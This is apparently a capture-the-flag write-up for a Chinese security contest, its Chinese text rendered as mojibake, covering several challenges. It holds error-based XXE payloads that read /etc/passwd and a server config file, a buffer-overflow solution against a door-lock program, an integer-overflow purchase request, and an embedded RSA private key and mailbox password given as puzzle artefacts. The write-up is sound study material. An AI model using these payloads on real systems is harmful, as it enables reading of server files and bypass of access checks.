deflate Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-CN;q=0.7,zh;q=0.6 Cookie: session=eyJsb2dpbiI6dHJ1ZX0.YmDQVQ.XDtZokQz966yViM6teda1VnD42Y Connection: close &lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE message [ &lt;!ELEMENT message ANY&gt; &lt;!ENTITY % x SYSTEM \"file:///proc/self/cwd/config.py\"&gt; &lt;!ENTITY % y ' &lt;!ENTITY &amp;#x25; z \"&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;&amp;#x25;x;&amp;#x27;&gt;\"&gt; &amp;#x25;z; '&gt; %y; ]&gt; &lt;message&gt;233&lt;/message&gt; æ‹¿åˆ° flag T-STAR{welcome.good/start!} References &amp; Extended Reading ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£æ¼æ´ä¹‹ XXE æ¼æ´ â€”â€” JSON content-type XXE XML External Entity (XXE) Processing javaçš„xxeæ— å›æ˜¾çš„å¸¦å¤–ä¼ è¾“ æŠ¥é”™XXE &lt;?xml version=\"1.0\" ?&gt; &lt;!DOCTYPE message [ &lt;!ENTITY % file SYSTEM \"file:///etc/passwd\"&gt; &lt;!ENTITY % a ' &lt;!ENTITY &amp;#x25; b \" &lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27; &gt; \"&gt; '&gt; %a; %b; ]&gt; &lt;message&gt;asfddasfd&lt;/message&gt; phit0onå¸ˆå‚…åœ¨å…¶å°å¯†åœˆä¸­çš„payload: &lt;?xml version=\"1.0\" ?&gt; &lt;!DOCTYPE message [ &lt;!ENTITY % condition ' &lt;!ENTITY &amp;#x25; file SYSTEM \"file:///etc/passwd\"&gt; &lt;!ENTITY &amp;#x25; eval \"&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;\"&gt; &amp;#x25;eval; &amp;#x25;error; '&gt; %condition; ]&gt; &lt;message&gt;any text&lt;/message&gt; èµ›é¢˜äºŒ IDèƒŒå ä½ ç´§ç›¯ç€ç½‘ç«™ç•Œé¢ï¼Œè¿™ä¸€ç•ªåŠŸå¤«ä¸‹æ¥ï¼Œé™¤äº†è¿™ä¸ªIDï¼Œä½ ä¸€æ— æ‰€è·ã€‚å¯æƒœï¼ŒIDä¸ä¼šè¯´è¯ã€‚ ç­‰ç­‰â€¦â€¦IDï¼ŒçœŸçš„ä¸ä¼šè¯´è¯å—ï¼Ÿè¿™ä¸ªIDâ€¦â€¦ä¼šä¸ä¼šè—ç€æ›´å¤šä¿¡æ¯ï¼Ÿæœ‰æ²¡æœ‰å¯èƒ½ï¼Œå®šä½åˆ°è¿™ä¸ªIDèƒŒåçš„ä¸»äººï¼Œç©¶ç«Ÿåœ¨åœ¨å“ªé‡Œï¼Ÿ æç¤ºï¼šç­”æ¡ˆä¸ºåŸå¸‚å(é™ä¸­æ–‡/å°å†™è‹±æ–‡) eg. åŒ—äº¬æˆ–è€…beijing è¯•äº†ä¸‹ä¸Šä¸€é¢˜ /api/info é‚£é‡Œè¿”å›çš„ä¿¡æ¯ï¼Œæˆéƒ½ï¼Œä¸å¯¹ã€‚ ç„äº†çœ¼ç›´æ’­é—´çš„ IDï¼ŒnightBaron042ï¼Œè¿˜æœ‰ä¸ª [ TIPS ] æ¬¢è¿å…³æ³¨ä¸»æ’­çš„å¾®åš https://weibo.com/u/7704722851 è§†é¢‘é‡Œæœ‰ä¸ª ID yuyangzhou æœäº†ä¸‹åæ­£ä¹Ÿæ˜¯è…¾è®¯çš„å‘˜å·¥ã€‚ éšä¾¿çŒœä¸€ä¸‹ æ·±åœ³ å§ï¼Œå™¢å¯¹äº†ã€‚ï¼ˆè·‘ å®˜æ–¹è§£ç­”æ˜¯é‚£æ¡å¾®åšé‡Œä¸¤å¼ å›¾ diffï¼Œä¸åŒç‚¹çš„åæ ‡ä½œä¸ºç»çº¬åº¦å¾—åˆ°æ˜¯æ·±åœ³ï¼Œå””ï¼Œåæ­£ç›²çŒœä¹Ÿä¸æ˜¯ä¸è¡Œï¼ˆ èµ›é¢˜ä¸‰ è§†çº¿ä¹‹å¤– ä¸€ä¸åšäºŒä¸ä¼‘ï¼Œä½ å†³å®šç´¢æ€§å»ç›®çš„åœ°ä¸€æ¢ç©¶ç«Ÿã€‚ ä½ è·Ÿç€æŒ‡ç¤ºä¸€è·¯æ‰¾äº†è¿‡æ¥ï¼Œå‘ç°è‡ªå·±ç«™åœ¨ä¸€æ‰‡ç´§é”çš„å¤§é—¨å‰ã€‚åˆšä¸€é è¿‘ï¼Œé—¨ç¦ç³»ç»Ÿå°±å‘ç”Ÿäº†åˆºè€³çš„è­¦å‘Šå£°ã€‚ ç¡¬é—¯æ˜¾ç„¶æ˜¯ä¸å¯èƒ½çš„ï¼Œä½ ç´§ç›¯ç€å¤§é—¨ä¸Šçš„æ ‡å¿—ï¼Œçªç„¶çµå…‰ä¸€ç°ï¼šè¯•è¯•æ•æ‰æµé‡å§ï¼ æœç„¶ï¼Œä½ æ•æ‰åˆ°äº†ä¸€æ®µæµé‡ï¼è¿™ä¸ªé‡Œé¢ï¼Œä¼šä¸ä¼šæœ‰ä½ éœ€è¦çš„å…³é”®ä¿¡æ¯ï¼Ÿ http://175.178.148.197/031ocvpfrc1b79a0f61/pkt æç¤ºï¼šåŒ…å«å¤šä¸ªå°å…³å¡ï¼Œè¯·æäº¤æœ€åä¸€å…³ç­”æ¡ˆï¼Œç­”æ¡ˆä¸å¸¦T-Star{}. æµé‡åŒ…å•Šï¼Œçœ‹èµ·æ¥æ˜¯ adb çš„æµé‡ã€‚ å¾—åˆ° pass: yun202203 çœ‹èµ·æ¥æ˜¯ adb backupï¼Œæ˜¯å®‰å“ç³»ç»Ÿå¤‡ä»½æ–‡ä»¶abæ ¼å¼ã€‚ é€‰æ‹©åŸå§‹æ•°æ®å¯¼å‡ºæ¥ï¼Œå†å»æ‰å¤šä½™çš„ OKAYï¼Œå¾—åˆ°çº¯ç²¹çš„ .ab æ–‡ä»¶ã€‚ åˆ©ç”¨ Android backup extractor å’Œå‰é¢çš„å¯†ç ï¼Œå°†å¤‡ä»½æ–‡ä»¶è§£åŒ…ã€‚ Utility to extract and repack Android backups created with adb backup (ICS+). Largely based on BackupManagerService.java from AOSP. å¯ä»¥ç›´æ¥ä¸‹è½½æ‰“åŒ…å¥½çš„ jar https://github.com/nelenkov/android-backup-extractor/releases/ å¦å¤–éœ€è¦ç”¨é«˜ç‰ˆæœ¬çš„ java æ¥è¿è¡Œã€‚ java -jar abe.jar unpack data.ab data.tar yun202203 ç„ä¸€ä¸‹å¾—åˆ°çš„ tar æœ‰ä¸€ä¸ª apkï¼Œä¹Ÿå°±æ˜¯ backup æŒ‡å®šçš„é‚£ä¸ªã€‚ é€†å‘çœ‹çœ‹ã€‚ Step1.class package ctf.misc.step; public class Step1 { public static String FlagStep1 = \"175.178.148.197:80\"; } MainActivity.class package ctf.misc.step; import android.os.Bundle; import android.support.v7.app.AppCompatActivity; public class MainActivity extends AppCompatActivity { protected void onCreate(Bundle var1) { super.onCreate(var1); this.setContentView(2131296283); } } è·å¾—äº† Flag ç¬¬ä¸€éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯é‚£ä¸ª IPã€‚å…¶ä»–çš„æ–‡ä»¶ç¿»äº†æŒºå¤šæ²¡æ‰¾åˆ°å•¥æœ‰æ„ä¹‰çš„ï¼Ÿ å†çœ‹è¿™ä¸ªå‹ç¼©åŒ… .d.zip private_key.pem -----BEGIN RSA PRIVATE KEY----- MIICXQIBAAKBgQCkbqcFM+hbrP+3DERi3gJY9rfwVhzAmBzbgpCAxnWO/Ip1OKtF RgSyqxJnzzptHTFvqbUbP/+Umqm/MfwrorYHyr3rfm70yM4qX4bpYCIWMkzeplEx V9Y3o3pVw7w/ISTzRVO5Woi/eyTDgVwguOKb9Fi9QLjCrxeWL9AtsKnsawIDAQAB AoGBAJac2BV250VZn9yNuvIIQoQ0cGUOq0VpzzztSej6X2G6RiR65L4OFW2GLtSx RuX9EHQkMUQlibgXNpZvdXiOkEX44W14JisHfJ2fCLdUKjr/aqDSR3Yo8+raaght FUIZyJQG1SqJM+PV2HqKPOW3+IQ6HRAxST+H0l5sUqWPmjQpAkEA0jZHZOV1UJdJ MK+iXHjpGHaXz5u6MlNuRaLioBjcvCzduZgmFuazMwkVBqy7l6R4UOMqt4HRbkUi 5uwfZnbDdwJBAMg/oJz07C4cHmci9J5NNHruToc3JEQz8pmBAKwlM9IKwEtr8NHM 4sIiW7i1K2RVHs3Uxi7iVnGHT6sF/ErKE60CQQCMGGqaXqZB0KGRlevyDw7iI99n GFUORzYdqMG6ivdJXeljUHhKGPRi1fGyYhofpRgeaFdGt3j5MZBiMAl5QztfAkAy DV1a/gkuuU6MHvufudJ9S6WLPKgu+AESh2Egpifev1szPuaxuhGPzsC4WWhgKrqJ Xj6vJ1nOBLFQIS3fj8T9AkAqFjwCoZjy8cvI2/xyJa65NqeWsPI8rHB76cSmsdhb 3Gtz+ZNfPpVF5pN3F0/eMdA7VsOlc4Ea40DlHIY9Yjdg -----END RSA PRIVATE KEY----- key.en å¤§æ¦‚ç‡æ˜¯åŠ å¯†çš„ç­¾åï¼Œç½‘ä¸Šæ‰¾ä¸ªå·¥å…·è§£å¯†ä¸€ä¸‹ã€‚ https://www.bejson.com/enc/rsa/ éœ€è¦æŠŠå¯†æ–‡ base64 ç¼–ç ä¸€ä¸‹ $ cat key.en | base64 ch/mu/NWBxYPZLqN1BD/eXm5IogOvubhhvJxQNqMtX9tm7zaM/xiq0cOGiFBkakf0FAOObLqnpf5 7+mp5b47QX/GQoXCmexyESXXiAVCQYNQ9JD2HPyb2FJsqhHKxlou6cbPSWKoxbLqm89AKtZOObMk kOZgm8qF91gUrR3Vd8Y= æˆ–è€…ç”¨ http://tool.chacuo.net/cryptrsaprikey ä¹Ÿè¡Œ æœ¬åœ°çš„è¯ä¹Ÿå¯ä»¥æ‹¿ openssl æ¥ $ openssl rsautl -decrypt -in key.en -inkey private_key.pem -out key.de $ cat key.de 9BlteBJnZpwrRjbL0DsGlFz5M+MDG74jYIj0zzivGPVW75jYZQpdzpfrpEBcXAJqHrlZlEw9hMhRQ8FijkATyMxpKsPXEWT5K6M5 åŠ å¯†çš„è¯ç±»ä¼¼äº openssl rsautl -encrypt -in data.txt -inkey public.key -pubin -out data_en.txt åæ¥å‘ç°ç›´æ¥ cyberchef å°±èƒ½åŠ è§£å¯†ï¼ˆ è§£å¯†å¾—åˆ°æ˜æ–‡ 9BlteBJnZpwrRjbL0DsGlFz5M+MDG74jYIj0zzivGPVW75jYZQpdzpfrpEBcXAJqHrlZlEw9hMhRQ8FijkATyMxpKsPXEWT5K6M5 å½“ä½œå¯†ç è§£å‹ flag.zipï¼Œå†…å®¹ä¸º 1111111010010101010110111111110000010100011000111101000001101110100110100101000010111011011101010000110001000101110110111010110100100101101011101100000100100111011001010000011111111010101010101010111111100000000001111001000000000000110011010000110101010011011110001110110101101011000011110000110100101110010010111111000100001101000011010000100000100100101101001011010010101111010011110100111101001110000011110100101101001011010010001110011101101111011001110000001001010101001100011001001001001110111111111111011101101001010111001101110111001001110111000001111100011001000010100110110011111011010100111110010001100100011110011001100000000001001010101101010111001111111010110001101000101001010000011100111110010001000100101110101010011111111110111101011101000000010000000000111010111011110001010110111001110100000101110011101101110011101111111 binary è½¬ ASCII æ²¡å•¥å¯è§å­—ç¬¦ã€‚æ€»å…±841å­—ç¬¦ï¼Œæ­£å¥½29*29. ç›²çŒœæ˜¯äºŒç»´ç ï¼Œé‚£ç”»ä¸ªå›¾å§ã€‚ #!/usr/bin/env python3 from PIL import Image MAX = 29 pic = Image.new(\"RGB\",(MAX, MAX)) str = \"1111111010010101010110111111110000010100011000111101000001101110100110100101000010111011011101010000110001000101110110111010110100100101101011101100000100100111011001010000011111111010101010101010111111100000000001111001000000000000110011010000110101010011011110001110110101101011000011110000110100101110010010111111000100001101000011010000100000100100101101001011010010101111010011110100111101001110000011110100101101001011010010001110011101101111011001110000001001010101001100011001001001001110111111111111011101101001010111001101110111001001110111000001111100011001000010100110110011111011010100111110010001100100011110011001100000000001001010101101010111001111111010110001101000101001010000011100111110010001000100101110101010011111111110111101011101000000010000000000111010111011110001010110111001110100000101110011101101110011101111111\" i=0 for y in range (0,MAX): for x in range (0,MAX): if(str[i] == '1'): pic.putpixel([x,y],(0, 0, 0)) else: pic.putpixel([x,y],(255,255,255)) i = i+1 pic.show() pic.save(\"flag.png\") å¾—åˆ°ä¸€ä¸ªäºŒç»´ç  æ‰«ç å¾—åˆ° /033yia8rqea1921ca61/systemlockdown æ‹¼ä¸€ä¸‹ï¼Œè®¿é—® http://175.178.148.197/033yia8rqea1921ca61/systemlockdown å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œæ˜¯ä¸ª zip å‹ç¼©åŒ…ã€‚ readme é—¨ç¦ç”¨çš„æ˜¯Windows 10ï¼Œx86ç³»ç»Ÿâ€¦â€¦ç»è¿‡ä¸€ç•ªåˆ†æï¼Œä½ æˆåŠŸæ‹¿åˆ°äº†é—¨ç¦ç³»ç»Ÿæºç ï¼Œå¯å–œçš„æ˜¯ï¼Œé—¨ç¦è®¤è¯ç³»ç»Ÿå·²ç»å†™æ­»ï¼Œå³ä½¿æ˜¯ç®¡ç†å‘˜ä¹Ÿæ— æ³•æ›´æ–°ã€‚ ä½†ï¼Œå°±åœ¨ç ´è§£æºç çš„è¿‡ç¨‹ä¸­ï¼Œç®¡ç†å‘˜ä¹Ÿè§‰å¯Ÿåˆ°é—¨ç¦æºç æ³„éœ²ï¼Œæå‰å…³é—­äº†é—¨ç¦ç³»ç»Ÿï¼Œä½ è¾“å…¥çš„å¯†ç å°†æ— æ³•è®¤è¯ã€‚ æ—¶é—´ä¸€åˆ†ä¸€ç§’è¿‡å»ï¼Œä¸èƒ½å†çŠ¹è±«äº†ï¼Œéœ€è¦ç«‹å³è¾“å…¥å¯†ç ï¼Œè§£é”é—¨ç¦ã€‚ PS: MSVC 2015ä»¥åçš„ç‰ˆæœ¬ç¼–è¯‘ï¼ŒDebugï¼Œä¸å¼€å¯ä»»ä½•ä¼˜åŒ–ï¼Œè¯·ä»¥æä¾›çš„é™„åŠ ææ–™ä¸ºå‡†ï¼ˆBinaryä¸ä¸‹åˆ—æºç è¡¨ç°ä¸€è‡´ï¼Œè¾“å…¥çš„ç­”æ¡ˆé€šè¿‡ä¸å¦è¯·ä»¥è¯¥Binaryçš„è¾“å‡ºä¸ºå‡†ï¼‰ã€‚ flagï¼šå¦‚æœä½ è®¤ä¸ºè¾“å…¥12345å¯ä»¥è§£é”é—¨ç¦ï¼Œåˆ™è¯·æäº¤ç­”æ¡ˆï¼šmd5(12345) #include &lt;iostream&gt; struct door_key { unsigned char passed : 1; unsigned char checksum1 : 2; unsigned char checksum2 : 2; unsigned char checksum3 : 3; }; //The system doesn't allow ANYBODY to log in now. #define SYSTEM_SHUTDOWN 1 void check(char* password, door_key* d) { if (SYSTEM_SHUTDOWN) { return; } if (memcmp(password, \"888888\", 6) == 0) { d-&gt;passed = 1; d-&gt;checksum1 = 88; d-&gt;checksum2 = 88; d-&gt;checksum3 = 88; } } void call_the_police() { abort(); } int main() { door_key* checker1 = 0; struct { char password[6]; char key_data; } management = { 0 }; char ch = 0; char last_ch = 0; int i = 0; if (SYSTEM_SHUTDOWN) { std::cout &lt;&lt; \"Notify from the administrator: NOBODY is allowed to login now!!!\" &lt;&lt; std::endl; std::cout &lt;&lt; \"YOUR LOGIN REQUEST WILL NOT BE HANDLED AND WE WILL CALL THE POLICE INSTANTNLY IF YOU DIDN'T PASS THE CHECK.\" &lt;&lt; std::endl; } retry: std::cout &lt;&lt; \"Please enter your 6-digit password, type '[6 digit number] then Enter' to confirm (For example: 123456): \" &lt;&lt; std::endl; for (i = 0; i &lt;= 6; i++) { ch = std::cin.get(); if (ch == '\\n') break; if (!isdigit(ch) &amp;&amp; ch != '\\n') call_the_police(); // Developer A: // Add an easy check, our strong 6-digit password is 888888 ! // Pre-check if every digit is the same. if (ch != '\\n' &amp;&amp; last_ch &amp;&amp; ch != last_ch) call_the_police(); last_ch = ch; management.password[i] = ch; }; checker1 = (door_key *)&amp;(management.key_data); check(management.password, checker1); if ((checker1-&gt;passed &amp;&amp; (checker1-&gt;checksum1 == checker1-&gt;checksum2) &amp;&amp; checker1-&gt;checksum3 &gt; 0)) { std::cout &lt;&lt; \"Congurations! You have entered the correct password.\"; } else call_the_police(); } è¿˜ç»™äº†äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ å–µå–µä¸å¤§ä¼šé€†å‘ï¼Œé™æ€+åŠ¨æ€åˆ†æäº†ä¸€ä¸‹ï¼Œç”±äºå¼€äº† debugï¼Œä¸å¤§å¥½é€†ï¼Œæ‘¸äº†ã€‚ ä¸è¿‡å¯ä»¥çŸ¥é“çš„æ˜¯ï¼Œå¯ä»¥è¾“å…¥7ä½å­—ç¬¦ï¼Œå¦‚æœæœ€åä¸€ä½é \\n ä¸”é 0x00ï¼Œé‚£å°±èƒ½æº¢å‡ºè®© checker1-&gt;passed ä¸ºçœŸã€‚ åŒæ—¶ checker1 = (door_key *)&amp;(management.key_data); è¿™é‡Œä¼šæŠŠæœ€åä¸€ä½å­—ç¬¦å¼ºåˆ¶è½¬æ¢ä¸º struct door_keyï¼Œæœ€åæ ¡éªŒçš„æ˜¯ (checker1-&gt;checksum1 == checker1-&gt;checksum2) &amp;&amp; checker1-&gt;checksum3 &gt; 0ã€‚ åˆæ ¹æ®ä»£ç å’Œæ³¨é‡Šï¼Œè¾“å…¥çš„æ¯ä¸€ä½æ•°å­—åº”è¯¥éƒ½æ˜¯ç›¸åŒçš„ã€‚ éšä¾¿è¯•äº†è¯•ï¼Œ7ä¸ª5å°±æˆåŠŸäº†ã€‚ md5(5555555) 992e63080ee1e47b99f42b8d64ede953 å…¶å®åŸç†æ˜¯ è¿™ä¸ª ASCII char çš„å€¼çš„æ¯ä¸€ä¸ª bit å¼ºåˆ¶è½¬æ¢åˆ°è¿™ä¸ªç»“æ„ä½“çš„æ¯ä¸€ bitã€‚ è€Œ 5 çš„ ASCII å¯¹åº”äº† 0x35ï¼Œå³ 00110101ï¼Œåˆ†é…åˆ° struct å°±å˜æˆäº† passed = 1 / checksum = 01 / checksum2 = 01 / checksum3 = 001 äºæ˜¯å°±æ»¡è¶³æ¡ä»¶äº†ï¼Œè€Œå…¶ä»–æ•°å­—éƒ½ä¸ç¬¦åˆã€‚ References &amp; Extended Reading .ab æ–‡ä»¶é€†å‘åˆ†æ https://sqlitebrowser.org/dl/ Hacking android apps using backup techniques adbå‘½ä»¤å¤‡ä»½æ¢å¤æ‰‹æœºä¿¡æ¯ 2015XCTF-RCTF ç¬¬ä¸€é“Mobileé¢˜ åˆ©ç”¨opensslè¿›è¡ŒRSAåŠ å¯†è§£å¯† èµ›é¢˜å›› äººå»æ¥¼ç©º ç»ˆäºæˆåŠŸè§£å¼€äº†é—¨ç¦ï¼è¿›å…¥äº†ç´§é—­çš„æˆ¿é—´ï¼Œè¿™é‡Œä¼¼ä¹æ›¾ç»æ˜¯ä¸€ä¸ªæ€»éƒ¨å®éªŒå®¤ï¼Œç„¶è€Œæ­¤åˆ»å·²æ˜¯äººå»æ¥¼ç©ºï¼Œæˆ¿é—´é‡Œç©ºè¡è¡çš„ï¼Œä¸€ä¸ªäººéƒ½æ²¡æœ‰ã€‚ çœ‹æ¥ï¼Œä¸ç®¡è¿™é‡Œæ›¾ç»æ˜¯è°åœ¨è¿™é‡Œï¼Œæˆ¿é—´é‡Œçš„ç§˜å¯†éƒ½å·²ç»éšç€ä¸»äººä¸€èµ·ç¦»å¼€äº†ã€‚ çªç„¶ï¼Œä¸€è‚¡åˆºè€³çš„é—¹é’Ÿé“ƒå£°åˆ’ç ´å¯‚é™â€”â€” ç«Ÿç„¶æœ‰äººåœ¨è¿™é‡Œç•™äº†ä¸€éƒ¨æ‰‹æœºï¼Ÿéš¾é“è¯´ï¼Œä½ çš„ä¸€ä¸¾ä¸€åŠ¨éƒ½åœ¨äººçš„æ„æ–™ä¹‹ä¸­ï¼Ÿ é“ƒå£°ä¸çŸ¥ç–²å€¦åœ°å“ç€ï¼Œä¼¼ä¹ç¬ƒå®šäº†ä½ ä¼šæ¥ã€‚ ä½ æ‹¿èµ·äº†æ‰‹æœºã€‚ è¿™é‡Œé¢æ˜¯æœ‰ä»€ä¹ˆä¿¡æ¯å—ï¼Ÿ http://175.178.148.197/b378603d0266d73e743c8d05f5bc3ebe.zip æç¤ºï¼šéœ€è¦ä¿®å¤äºŒç»´ç ä¸å‹ç¼©åŒ…ï¼Œåˆ†æå‡ºå‹ç¼©åŒ…å¯†ç ï¼Œç­”æ¡ˆä¸ºè§£å‹åçš„TXTå†…å®¹ è§£å‹å¾—åˆ°ä¸€ä¸ª ç ´é•œé‡åœ† æ–‡ä»¶å¤¹ ç†Ÿç»ƒåœ°æ‰“å¼€ psï¼Œå¤åˆ¶ä¸€ä¸ªå®šä½å—åˆ°å·¦ä¸Šè§’ æ‰«ç å¾—åˆ° https://public.huoxian.cn/ctf/call_me.zip ä¸‹è½½ä¸‹æ¥é‡Œé¢æœ‰ä¸ªåŠ å¯†çš„ flag.txtï¼Œçœ‹æ¥å¾—ä»å¦ä¸€ä¸ª æˆ‘çœŸæ˜¯ä¸€ä¸ªå‹ç¼©åŒ….zip é‡Œæ‹¿è§£å‹å¯†ç äº†ã€‚ 010editor ç„ä¸€çœ¼ï¼Œå‘ç°å¤´éƒ¨æ–‡ä»¶å¤´è¢«æ”¹äº†ï¼Œæ”¹å›å» 504B0304 è§£å‹å¾—åˆ° æ°¸ä¸æ¶ˆé€çš„ç”µæ³¢.mp3 å•Šï¼Œåˆæ˜¯ç†Ÿæ‚‰çš„ Morseã€‚ .---- ----. ----. .---- ----- ...-- ---.. -.... --... ----. --... è§£ç å¾—åˆ° 19910386797 å½“æˆå¯†ç è§£å‹å¾—åˆ° flag.txt https://darknet.hacker5t2ohub.com/ ï¼ˆæ‰€ä»¥è¿™ä¸ªæ‰‹æœºå·ä¼šä¸ä¼šæœ‰ç”¨å‘¢ åæ¥å‘ç°æ²¡ç”¨ èµ›é¢˜äº” ä¸çœ ä¹‹å¤œ è¿™ä¸ªç½‘å€ï¼ä½ çŸ¥é“ï¼è¿™æ˜¯ä¸€ä¸ªæœç´¢å¼•æ“æ— æ³•æ•æ‰çš„åœ°æ–¹ï¼Œä¸€ä¸ªé»‘æš—çš„å¹³è¡Œä¸–ç•Œã€‚åœ¨è¿™ä¸ªä¸–ç•Œé‡Œï¼Œæ¯’å“ã€ä¿¡æ¯è´©å–ã€å†›ç«äº¤æ˜“ã€è°‹æ€ç­‰ä¸€ç³»åˆ—è¢«æ³•å¾‹æ‰€ç¦æ­¢çš„äº‹æƒ…ï¼Œéƒ½å¾—åˆ°äº†ç½ªæ¶åœŸå£¤ï¼Œä¸€åˆ‡äº¤æ˜“éƒ½é€šè¿‡å¹³å°ä¸Šç‰¹å®šçš„è´§å¸éšç§˜åœ°è¿›è¡Œã€‚ æ®è¯´åªè¦æœ‰ã€Œè¶³å¤Ÿã€çš„é’±ï¼Œä½ èƒ½ä¹°åˆ°ä»»ä½•éœ€è¦çš„ä¿¡æ¯ã€‚ è¿™ä¸ªç½‘ç«™é‡Œä¼šä¸ä¼šæœ‰ä½ éœ€è¦çš„çº¿ç´¢ï¼Ÿä»–ä»¬å¯é å—ï¼Ÿ æœªçŸ¥ï¼Œæ°æ°æœ€èƒ½æ¿€èµ·ä½ çš„å¾æœæ¬²ã€‚ ä½ å†³å®šé“¤è€Œèµ°é™©ï¼Œå‘é»‘å¸‚è¿›å‘ã€‚ æç¤ºï¼šéœ€è¦å…ˆè§£å‡ºç¬¬4é¢˜è·å¾—å…¥å£ï¼Œä¼šä¸€ç‚¹ç‚¹Goæ›´ä½³ï¼Œflagä¸ºT-Star{å­—ç¬¦ä¸²}ä¸­çš„å­—ç¬¦ä¸² ä¸Šä¸€é¢˜çš„ç½‘å€ https://darknet.hacker5t2ohub.com/ æ‹¿qqç™»å½• ï¼ˆå•¥å°ç”µå½±å•Šå¤šæ¥ç‚¹ å¿«æš´æ‰“å‡ºé¢˜äºº ç›´æ¥ä¹°é‚£ä¸ª 1000 çš„ä»˜è´¹å’¨è¯¢ã€‚è¯•äº†ä¸‹è´­ä¹°è¿™é‡Œ amount ç”¨äº† ParseIntï¼Œå­˜åœ¨æ•´æ•°æº¢å‡ºã€‚ é‚£åˆ°åº•æ˜¯å¤šå¤§æ‰èƒ½æº¢å‡ºå‘¢ï¼Ÿ GET /trpc.cors_filter_test.common.Darknet/Purchase?amount=4294967296&amp;gid=0x9 ==&gt; {\"code\":1, \"msg\":\"service codec Unmarshal: 1 error(s) decoding: * cannot parse 'amount' as int: strconv.ParseInt: parsing \"4294967296\": value out of range\"} GET /trpc.cors_filter_test.common.Darknet/Purchase?amount=65536&amp;gid=0x9 ==&gt; {\"code\":500, \"msg\":\"å•†å“æ•°é‡éæ³•ï¼Œè¯·é‡è¯•\"} ... æœ€åå„ç§è¯•äº†å‘ç°æ˜¯ 33 34 æº¢å‡ºï¼Œå””â€¦â€¦ GET /trpc.cors_filter_test.common.Darknet/Purchase?amount=34&amp;gid=0x9 HTTP/1.1 Host: darknet.hacker5t2ohub.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Authorization: xxxxx X-Requested-With: XMLHttpRequest Connection: keep-alive Referer: https://darknet.hacker5t2ohub.com/item.html?gid=12 Cookie: sTok=xxxxx Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Pragma: no-cache Cache-Control: no-cache TE: trailers å†çœ‹ä½™é¢å°±èƒ½éšä¾¿ä¹°ä¸œè¥¿äº†ã€‚ è¿™æ„Ÿè§‰è¿˜æœ‰ç‚¹ç²¾å¿ƒè®¾è®¡äº†ï¼Œåªæœ‰33ã€34å¯ä»¥æ»¡è¶³æ¡ä»¶ã€‚ èµ›åæ‰å‘ç°ç¡®å®æ˜¯ golang çš„ç‰¹æ€§ï¼Œæ˜¯å› ä¸ºæ€»ä»·æ ¼å¡åœ¨äº† int16 çš„è¾¹ç•Œã€‚ int8 : -128 to 127 int16 : -32768 to 32767 è€Œ 1000 * 33 æˆ–è€… 1000 * 34 æ­£å¥½ &gt; 32767 å®ç°æº¢å‡ºï¼Œå†å¤§å°±åº“å­˜ä¸è¶³äº†ã€‚ è¿™æ—¶å€™å†çœ‹æ”¶ä»¶ç®± å•†å“ã€ä»˜è´¹å’¨è¯¢ã€‘è´­ä¹°æˆåŠŸï¼Œä¿¡æ¯å¦‚ä¸‹ï¼š å‰å¾€å¾®ä¿¡å…¬ä¼—å·â€œè…¾è®¯å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒâ€(tsrc_team)ï¼Œå›å¤\"T-Star666\"è·å–ä¿¡æ¯ ç¦»è°±ï¼Œåˆæ˜¯å¥—å¨ƒã€‚ å›å¤åå¾—åˆ°ï¼š ä½ è¦æ‰¾çš„äººï¼Œå³å°†å‘èµ·å¤§èŒƒå›´è •è™«æ”»å‡»ï¼è¡ŒåŠ¨è®¡åˆ’å°±è—åŒ¿åœ¨é‚®ä»¶ä¸­ï¼Œåªæœ‰è§£å‡ºå¯†åŒ™æ‰èƒ½ç ´é™¤æ”»å‡»ï¼http://159.75.190.64/ nightbaron042@sohu.com nightBaron1996 æ€ä¹ˆåˆæ˜¯è¿™ç©æ„ï¼Œå¾®åšå’Œæ¯”èµ›ä»‹ç»é‡Œéƒ½è§è¿‡ã€‚ https://mail.sohu.com æ‹¿ä¸Šé¢çš„é‚®ç®±å’Œå¯†ç ç™»å½•ä¸€ä¸‹ã€‚ ï¼ˆèµ›åæ‰å‘ç°åŸæ¥å¾®åšé‚£å¼ å›¾çš„æ¡Œé¢ä¸Šè´´äº†å¼ çº¸æ¡ï¼Œä¸Šé¢å°±æœ‰å¯†ç ï¼Œä¹ Hi bros, å†¬å»æ˜¥æ¥ï¼Œç»ˆäºè¿æ¥æ­¤åˆ»ã€‚ç­‰å¾…è‰¯ä¹…ï¼Œæ—¶æœºå·²ç»æˆç†Ÿã€‚ç­‰å¾…çš„æ—¥å­é‡Œï¼Œæˆ‘çœ‹äº†å¾ˆå¤šä¹¦ï¼Œé‚£äº›ä¹¦é¡µä¸­çš„ç« èŠ‚å’Œæ®µè½å°±åƒæ—¶é’Ÿçš„æ—¶é’ˆå’Œåˆ†é’ˆä¸€æ ·ä¸æ–­å‰è¡Œï¼ŒæŒ‡å¼•æˆ‘ä»¬é€šå‘èƒœåˆ©ã€‚ è¿™æ¬¡è¡ŒåŠ¨ä¸€åˆ‡é¡ºåˆ©ï¼Œæˆ‘å°†ä¹˜èƒœè¿½å‡»ï¼Œå‘èµ·å‹’ç´¢ç—…æ¯’è •è™«æ”»å‡»ï¼Œå¯¹æ‰€æœ‰ç›®æ ‡ç”µè„‘æ–‡ä»¶è¿›è¡ŒåŠ å¯†ï¼Œå¹¶è‡ªåŠ¨æ‰©æ•£ï¼Œåªæœ‰æˆ‘çš„KEYæ‰èƒ½è§£å¯†ã€‚ æ•°æ®å‹’ç´¢åŠ 